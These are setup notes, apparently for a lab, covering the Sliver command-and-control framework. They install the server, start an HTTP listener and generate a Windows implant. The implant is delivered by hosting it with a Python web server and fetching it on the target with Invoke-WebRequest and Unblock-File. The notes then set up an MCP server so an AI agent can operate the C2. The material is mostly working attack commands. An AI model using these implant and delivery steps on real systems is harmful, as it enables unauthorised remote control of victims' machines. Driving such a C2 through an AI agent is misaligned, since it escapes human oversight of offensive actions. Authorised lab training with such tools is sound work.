sudo apt update
sudo apt install python3 python3-pip git nodejs curl httpie npm -y

pip3 install sliver-py --break-system-packages
pip3 install mcp --break-system-packages

pip3 install python-dotenv langfuse openai mcp --break-system-packages

curl https://sliver.sh/install | sudo bash

sudo /root/sliver-server operator --name mcp-operator --lhost 127.0.0.1 --save /home/student/sliver-operator.cfg -P all

--------------

start sliver server: sliver

http --lhost 0.0.0.0 --lport 80
generate --http <10.1.1.10>:80 --os windows --arch amd64 --skip-symbols --save ./implant.exe

Run implant.exe on the Windows machine with
1. On Attacker machine at file path of implant.exe: python3 -m http.server 8080

2. On windows machine: 
    Invoke-WebRequest -Uri "http://<UBUNTU_IP>:8080/implant.exe" -OutFile "C:\Users\Public\implant.exe"

    Unblock-File C:\Users\Public\implant.exe

---------------

mcp server:

# 2. Clone the repository there
git clone https://github.com/schwarztim/sec-sliver-c2-mcp.git

# 3. Enter the directory
cd sec-sliver-c2-mcp

# 1. Download the setup script for Node 20
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -

# 2. Install Node.js
sudo apt-get install -y nodejs
node -v

# 4. Install dependencies and build the compiled Javascript
npm install
npm run build

sudo chown student:student /home/student/sliver-operator.cfg